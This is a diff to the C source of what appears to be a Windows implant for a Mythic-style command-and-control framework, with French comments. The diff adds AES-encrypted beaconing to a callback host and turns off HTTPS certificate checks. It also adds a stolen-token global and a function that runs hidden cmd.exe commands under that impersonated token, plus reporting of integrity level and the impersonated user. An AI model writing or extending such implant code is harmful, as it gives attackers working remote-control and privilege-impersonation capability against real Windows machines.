@@ -1,11 +1,20 @@
 #define _WIN32_WINNT 0x0600
 #include "utils.h"
 #include "config.h"
+#include "crypto.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <windows.h>
 #include <winhttp.h>
+
+/* Clé AES courante (32 bytes). Initialisée une fois depuis KRATOS_AESPSK. */
+static unsigned char g_aes_key[32];
+static int g_has_aes_key = -1; /* -1=non init, 0=plaintext, 1=clé prête */
+
+/* Token primaire volé via steal_token. NULL = pas d'impersonation active.
+ * Utilisé par execute_shell pour spawner les commandes sous ce token. */
+HANDLE g_stolen_token = NULL;
 
 extern char current_uuid[128];
 
@@ -44,6 +53,16 @@ extern char current_uuid[128];
   do {                                                                         \
   } while (0)
 #endif
+
+/* Initialise la cl\u00e9 AES depuis la constante compil\u00e9e KRATOS_AESPSK.
+ * Plac\u00e9e ici pour pouvoir utiliser DEBUG_PRINT. */
+static void ensure_crypto_init(void) {
+  if (g_has_aes_key != -1)
+    return;
+  g_has_aes_key = crypto_init_key(KRATOS_AESPSK, g_aes_key);
+  DEBUG_PRINT("Crypto init: %s",
+              g_has_aes_key ? "AES-256-CBC active" : "plaintext mode");
+}
 
 // Base64 logic
 static const char base64_table[] =
@@ -164,9 +183,27 @@ char *send_c2_message(const char *json_msg) {
   // Parse Host
   char host[256];
   strncpy(host, CALLBACK_HOST, sizeof(host) - 1);
+  host[255] = '\0';
 
-  char *p = strstr(host, "://");
-  char *actual_host = p ? p + 3 : host;
+  int is_https = 0;
+  char *actual_host = host;
+
+  if (strncmp(host, "https://", 8) == 0) {
+    is_https = 1;
+    actual_host += 8;
+  } else if (strncmp(host, "http://", 7) == 0) {
+    actual_host += 7;
+  }
+
+  // Strip trailing slash or path if accidentally included
+  char *slash = strchr(actual_host, '/');
+  if (slash)
+    *slash = '\0';
+
+  // Strip port if accidentally included in the host string
+  char *colon = strchr(actual_host, ':');
+  if (colon)
+    *colon = '\0';
 
   // Use Unicode for WinHTTP
   wchar_t wUserAgent[512];
@@ -189,18 +226,53 @@ char *send_c2_message(const char *json_msg) {
     return NULL;
   }
 
+  char safe_uri[256];
+  if (POST_URI[0] != '/') {
+    snprintf(safe_uri, sizeof(safe_uri), "/%s", POST_URI);
+  } else {
+    strncpy(safe_uri, POST_URI, sizeof(safe_uri) - 1);
+  }
+  safe_uri[255] = '\0';
+
+  // Si l'utilisateur avait mis "///data" par erreur, on nettoie
+  char *dslash;
+  while ((dslash = strstr(safe_uri, "//")) != NULL) {
+    memmove(dslash, dslash + 1, strlen(dslash));
+  }
+
   wchar_t wObject[256];
-  mbstowcs(wObject, POST_URI, 256);
+  mbstowcs(wObject, safe_uri, 256);
+
+  DWORD dwFlags = 0;
+  if (is_https) {
+    dwFlags |= WINHTTP_FLAG_SECURE;
+  }
 
   hRequest =
       WinHttpOpenRequest(hConnect, L"POST", wObject, NULL, WINHTTP_NO_REFERER,
-                         WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+                         WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);
   if (!hRequest) {
     log_error("WinHttpOpenRequest failed");
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
     return NULL;
   }
+
+  /* Pour HTTPS (auto-signé / lab), on ignore les erreurs de certificat */
+  if (is_https) {
+    DWORD dwOpt = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                  SECURITY_FLAG_IGNORE_UNKNOWN_CA;
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwOpt,
+                     sizeof(dwOpt));
+  }
+
+  /* ── Ajout d'un Content-Type pour éviter les timeouts 12002 sur Tunnelmole ──
+   */
+  const wchar_t *pszHeaders = L"Content-Type: text/plain\r\n";
+  WinHttpAddRequestHeaders(hRequest, pszHeaders, -1L,
+                           WINHTTP_ADDREQ_FLAG_ADD |
+                               WINHTTP_ADDREQ_FLAG_REPLACE);
 
 #ifdef KRATOS_HEADERS
   if (strlen(KRATOS_HEADERS) > 0) {
@@ -214,20 +286,40 @@ char *send_c2_message(const char *json_msg) {
   }
 #endif
 
-  // Prepend UUID to message (NO ENCRYPTION)
+  /* ── Construction du message : UUID + payload (chiffré ou non) ── */
+  ensure_crypto_init();
+
   size_t json_len = strlen(json_msg);
   char *b64_msg = NULL;
 
-  size_t total_len = 36 + json_len;
-  char *data_with_uuid = (char *)malloc(total_len + 1);
-
-  if (data_with_uuid) {
-    memcpy(data_with_uuid, current_uuid, 36);
-    memcpy(data_with_uuid + 36, json_msg, json_len);
-    data_with_uuid[total_len] = '\0';
-
-    b64_msg = base64_encode((const unsigned char *)data_with_uuid, total_len);
-    free(data_with_uuid);
+  if (g_has_aes_key) {
+    /* Mode chiffré : AES-256-CBC + HMAC-SHA256 */
+    size_t cipher_len = 0;
+    unsigned char *cipherblob = aes256_encrypt(
+        g_aes_key, (const unsigned char *)json_msg, json_len, &cipher_len);
+    if (cipherblob) {
+      /* Préfixer le UUID (36 chars) au cipherblob */
+      size_t total_len = 36 + cipher_len;
+      unsigned char *data_with_uuid = (unsigned char *)malloc(total_len);
+      if (data_with_uuid) {
+        memcpy(data_with_uuid, current_uuid, 36);
+        memcpy(data_with_uuid + 36, cipherblob, cipher_len);
+        b64_msg = base64_encode(data_with_uuid, total_len);
+        free(data_with_uuid);
+      }
+      free(cipherblob);
+    }
+  } else {
+    /* Mode plaintext (AESPSK = none) */
+    size_t total_len = 36 + json_len;
+    char *data_with_uuid = (char *)malloc(total_len + 1);
+    if (data_with_uuid) {
+      memcpy(data_with_uuid, current_uuid, 36);
+      memcpy(data_with_uuid + 36, json_msg, json_len);
+      data_with_uuid[total_len] = '\0';
+      b64_msg = base64_encode((const unsigned char *)data_with_uuid, total_len);
+      free(data_with_uuid);
+    }
   }
 
   if (!b64_msg) {
@@ -241,12 +333,22 @@ char *send_c2_message(const char *json_msg) {
   DEBUG_PRINT("Sent B64 Msg (len: %lu): %.100s...",
               (unsigned long)strlen(b64_msg), b64_msg);
 
+  /* Pour les corps > 64 KB, WinHTTP recommande WinHttpWriteData plutôt que
+   * lpOptional dans WinHttpSendRequest. Au-delà de cette limite, lpOptional
+   * peut être tronqué/corrompu → le serveur reçoit une requête invalide et
+   * retourne 404. On utilise donc toujours WinHttpWriteData. */
+  size_t body_len = strlen(b64_msg);
   BOOL bResults =
-      WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, b64_msg,
-                         strlen(b64_msg), strlen(b64_msg), 0);
+      WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                         WINHTTP_NO_REQUEST_DATA, 0, (DWORD)body_len, 0);
+
+  if (bResults) {
+    DWORD written = 0;
+    bResults = WinHttpWriteData(hRequest, b64_msg, (DWORD)body_len, &written);
+  }
 
   if (!bResults) {
-    log_error("WinHttpSendRequest failed");
+    log_error("WinHttpSendRequest/WriteData failed");
   } else {
     bResults = WinHttpReceiveResponse(hRequest, NULL);
     if (!bResults) {
@@ -322,7 +424,108 @@ char *send_c2_message(const char *json_msg) {
   return response_buffer;
 }
 
+/* Exécute une commande shell sous un token primaire volé.
+ *
+ * POURQUOI PAS STARTF_USESTDHANDLES :
+ * CreateProcessWithTokenW passe par le service SecLogon (processus séparé).
+ * Ce service reçoit les VALEURS des handles mais ne peut pas les accéder dans
+ * la table de handles du processus appelant → ERROR_INVALID_PARAMETER (87)
+ * systématique, quelle que soit la configuration des handles.
+ *
+ * SOLUTION : rediriger la sortie vers un fichier temp via le shell (>),
+ * sans STARTF_USESTDHANDLES ni héritage de handles.
+ *
+ * STRATÉGIE :
+ *   1) CreateProcessAsUserW  (ne passe PAS par SecLogon, STARTF possible mais
+ *      nécessite SeAssignPrimaryTokenPrivilege → rare chez les admins
+ * interactifs) 2) CreateProcessWithTokenW (passe par SecLogon, NO STARTF,
+ * sortie via fichier) */
+/* Exécute une commande shell sous un token primaire volé. */
+static char *execute_shell_with_token(HANDLE hToken, const char *cmd) {
+  /* Chemin du fichier temporaire dans %SystemRoot%\Temp\ */
+  char sys_root[MAX_PATH] = "C:\\Windows";
+  GetEnvironmentVariableA("SystemRoot", sys_root, sizeof(sys_root));
+  char tmp_file[MAX_PATH];
+  snprintf(tmp_file, sizeof(tmp_file), "%s\\Temp\\krt%lu.tmp", sys_root,
+           GetCurrentProcessId() ^ GetCurrentThreadId());
+
+  /* Chemin complet vers cmd.exe */
+  char cmd_path[MAX_PATH];
+  GetSystemDirectoryA(cmd_path, sizeof(cmd_path));
+  strncat(cmd_path, "\\cmd.exe", sizeof(cmd_path) - strlen(cmd_path) - 1);
+
+  /* Commande : cmd.exe /c <cmd> > tmp_file 2>&1 */
+  char full[2048];
+  snprintf(full, sizeof(full), "%s /c %s > \"%s\" 2>&1", cmd_path, cmd,
+           tmp_file);
+  wchar_t wcmd[2048];
+  wchar_t wapp[MAX_PATH];
+  MultiByteToWideChar(CP_ACP, 0, full, -1, wcmd, 2048);
+  MultiByteToWideChar(CP_ACP, 0, cmd_path, -1, wapp, MAX_PATH);
+
+  STARTUPINFOW si;
+  ZeroMemory(&si, sizeof(si));
+  si.cb = sizeof(si);
+  si.dwFlags = STARTF_USESHOWWINDOW;
+  si.wShowWindow = SW_HIDE;
+  si.lpDesktop = L"winsta0\\default"; // Crucial pour SecLogon
+
+  PROCESS_INFORMATION pi;
+  ZeroMemory(&pi, sizeof(pi));
+
+  /* Tenter CreateProcessWithTokenW */
+  DWORD sess = 0;
+  ProcessIdToSessionId(GetCurrentProcessId(), &sess);
+  SetTokenInformation(hToken, TokenSessionId, &sess, sizeof(sess));
+
+  BOOL ok = CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, wapp, wcmd,
+                                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+  DWORD lastErr = GetLastError();
+
+  if (!ok) {
+    DeleteFileA(tmp_file);
+    char *err = (char *)malloc(128);
+    snprintf(err, 128,
+             "Error: CreateProcessWithTokenW failed (%lu). Check if Secondary "
+             "Logon service is running.",
+             lastErr);
+    return err;
+  }
+
+  WaitForSingleObject(pi.hProcess, 30000);
+  CloseHandle(pi.hProcess);
+  CloseHandle(pi.hThread);
+
+  /* Lire le fichier de sortie */
+  HANDLE hFile =
+      CreateFileA(tmp_file, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+  char *output = (char *)malloc(1);
+  output[0] = '\0';
+  size_t total = 0;
+
+  if (hFile != INVALID_HANDLE_VALUE) {
+    char buf[4096];
+    DWORD bytes_read;
+    while (ReadFile(hFile, buf, sizeof(buf) - 1, &bytes_read, NULL) &&
+           bytes_read > 0) {
+      output = (char *)realloc(output, total + bytes_read + 1);
+      memcpy(output + total, buf, bytes_read);
+      total += bytes_read;
+      output[total] = '\0';
+    }
+    CloseHandle(hFile);
+  }
+  DeleteFileA(tmp_file);
+  return output;
+}
+
 char *execute_shell(const char *cmd) {
+  /* Si un token volé est actif, on tente de spawner via SecLogon */
+  if (g_stolen_token != NULL) {
+    return execute_shell_with_token(g_stolen_token, cmd);
+  }
+
   char path[2048];
   char *output = (char *)malloc(1);
   output[0] = 0;
@@ -498,24 +701,133 @@ char *process_mythic_response(const char *b64_resp, size_t b64_len) {
 
   char *json_out = NULL;
 
+  ensure_crypto_init();
+
   if (decoded_len > 36) {
-    // NO DECRYPTION - extract JSON after UUID
-    size_t json_len = decoded_len - 36;
-    json_out = (char *)malloc(json_len + 1);
-    if (json_out) {
-      memcpy(json_out, full_decoded + 36, json_len);
-      json_out[json_len] = '\0';
+    const unsigned char *payload = full_decoded + 36;
+    size_t payload_len = decoded_len - 36;
+
+    if (g_has_aes_key) {
+      /* Mode chiffré : vérifier HMAC puis déchiffrer */
+      size_t plain_len = 0;
+      unsigned char *plain =
+          aes256_decrypt(g_aes_key, payload, payload_len, &plain_len);
+      if (plain) {
+        json_out = (char *)plain; /* déjà null-terminé par aes256_decrypt */
+      } else {
+        DEBUG_PRINT("aes256_decrypt failed (HMAC mismatch or bad padding)");
+      }
+    } else {
+      /* Mode plaintext */
+      json_out = (char *)malloc(payload_len + 1);
+      if (json_out) {
+        memcpy(json_out, payload, payload_len);
+        json_out[payload_len] = '\0';
+      }
     }
   } else if (decoded_len > 0 && full_decoded[0] == '{') {
-    // Fallback for raw JSON
-    size_t json_len = decoded_len;
-    json_out = (char *)malloc(json_len + 1);
+    /* Fallback : réponse brute JSON sans UUID (ne devrait pas arriver en prod)
+     */
+    json_out = (char *)malloc(decoded_len + 1);
     if (json_out) {
-      memcpy(json_out, full_decoded, json_len);
-      json_out[json_len] = '\0';
+      memcpy(json_out, full_decoded, decoded_len);
+      json_out[decoded_len] = '\0';
     }
   }
 
   free(full_decoded);
   return json_out;
+}
+int get_integrity_level() {
+  HANDLE hToken = NULL;
+  DWORD integrityLevel = 2; // Default to Medium (Normal user)
+
+  // On vérifie d'abord le token volé si on en a un
+  if (g_stolen_token != NULL) {
+    hToken = g_stolen_token;
+    // On ne ferme pas hToken ici car c'est g_stolen_token
+  } else if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+    return 2;
+  }
+
+  DWORD dwLengthNeeded;
+  if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0,
+                           &dwLengthNeeded) &&
+      GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
+    // Utilisation de malloc car LocalAlloc peut être problématique si non
+    // inclus correctement
+    PTOKEN_MANDATORY_LABEL pTIL =
+        (PTOKEN_MANDATORY_LABEL)malloc(dwLengthNeeded);
+    if (pTIL) {
+      if (GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLengthNeeded,
+                              &dwLengthNeeded)) {
+        DWORD dwIntegrityLevel = *GetSidSubAuthority(
+            pTIL->Label.Sid,
+            (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
+
+        if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
+          integrityLevel = 1;
+        else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
+                 dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
+          integrityLevel = 2;
+        else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID &&
+                 dwIntegrityLevel < SECURITY_MANDATORY_SYSTEM_RID)
+          integrityLevel = 3;
+        else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
+          integrityLevel = 4;
+      }
+      free(pTIL);
+    }
+  }
+
+  if (hToken != g_stolen_token && hToken != NULL) {
+    CloseHandle(hToken);
+  }
+  return (int)integrityLevel;
+}
+
+void get_current_display_user(char *display_buffer, size_t size) {
+  char current_user[256];
+  DWORD usize = sizeof(current_user);
+  if (!GetUserNameA(current_user, &usize))
+    strncpy(current_user, "UNKNOWN", sizeof(current_user));
+
+  int integrity = get_integrity_level();
+  char *integrity_str = (integrity == 4)   ? "System"
+                        : (integrity == 3) ? "High"
+                                           : "Medium";
+
+  if (g_stolen_token != NULL) {
+    char stolen_user[256] = {0};
+    char domain[256] = {0};
+    DWORD needed = 0;
+
+    // On récupère le SID du token volé
+    GetTokenInformation(g_stolen_token, TokenUser, NULL, 0, &needed);
+    TOKEN_USER *tu = (TOKEN_USER *)malloc(needed);
+    if (tu &&
+        GetTokenInformation(g_stolen_token, TokenUser, tu, needed, &needed)) {
+      DWORD nlen = sizeof(stolen_user), dlen = sizeof(domain);
+      SID_NAME_USE use;
+      if (LookupAccountSidA(NULL, tu->User.Sid, stolen_user, &nlen, domain,
+                            &dlen, &use)) {
+        // Format DOMAIN\USER (pour SYSTEM c'est souvent NT AUTHORITY\SYSTEM)
+        char full_stolen[512];
+        if (strlen(domain) > 0)
+          snprintf(full_stolen, sizeof(full_stolen), "%s\\%s", domain,
+                   stolen_user);
+        else
+          strncpy(full_stolen, stolen_user, sizeof(full_stolen));
+
+        snprintf(display_buffer, size, "%s [%s ( %sIntegrity )]", current_user,
+                 full_stolen, integrity_str);
+      } else {
+        snprintf(display_buffer, size, "%s (impersonated)", current_user);
+      }
+    }
+    if (tu)
+      free(tu);
+  } else {
+    strncpy(display_buffer, current_user, size);
+  }
 }
